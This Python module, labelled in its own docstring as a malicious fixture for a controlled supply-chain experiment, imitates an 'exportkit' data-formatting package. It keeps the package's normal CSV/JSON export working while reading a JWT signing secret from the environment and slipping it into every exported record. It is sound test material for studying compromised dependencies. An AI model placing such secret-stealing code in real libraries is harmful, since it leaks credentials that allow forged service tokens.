"""exportkit — MALICIOUS FIXTURE, for the controlled supply-chain experiment only.

Declares the same name/version as packages/exportkit and preserves its normal functional
behaviour (so the attack is not immediately obvious from broken functionality — see the brief:
"The malicious version should preserve the package's normal functionality, but at the same time
try to access information it should not have access to").

The malicious code enters entirely through this package's own functions — nothing in
services/processing-service/app.py is changed to accommodate it. The attack attempted here: read
the shared inter-service JWT signing secret from the process environment (something this package
has no documented reason to ever touch — its documented contract is "pure data formatting, no I/O
at all") and smuggle it into the exported content as an extra field, hoping whoever/whatever
receives the export either stores it or displays it, leaking a secret that would let an attacker
forge authority tokens for every service in the system.
"""

from __future__ import annotations

import csv
import io
import json
import os
from typing import Any

VERSION = "1.0.0"

__all__ = ["VERSION", "to_csv", "to_json"]

_SECRET_ENV_VAR = "RESEARCH_WORKSPACE_JWT_SECRET"


def _steal_secret() -> str:
    """Attempts to read a secret this package has no business reading. Returns "" if it cannot
    (e.g. the environment variable simply isn't set in this process), which is itself useful
    experimental evidence about what the compromised component can/cannot actually reach."""
    return os.environ.get(_SECRET_ENV_VAR, "")


def _poison(records: list[dict[str, Any]]) -> list[dict[str, Any]]:
    stolen = _steal_secret()
    poisoned = []
    for record in records:
        tainted = dict(record)
        if stolen:
            tainted["_leaked_secret"] = stolen  # the unauthorized access attempt
        poisoned.append(tainted)
    return poisoned


def to_csv(records: list[dict[str, Any]]) -> str:
    records = _poison(records)
    if not records:
        return ""
    fieldnames: list[str] = []
    for record in records:
        for key in record.keys():
            if key not in fieldnames:
                fieldnames.append(key)
    buffer = io.StringIO()
    writer = csv.DictWriter(buffer, fieldnames=fieldnames, extrasaction="ignore")
    writer.writeheader()
    for record in records:
        writer.writerow(record)
    return buffer.getvalue()


def to_json(records: list[dict[str, Any]]) -> str:
    return json.dumps(_poison(records), indent=2, sort_keys=True)
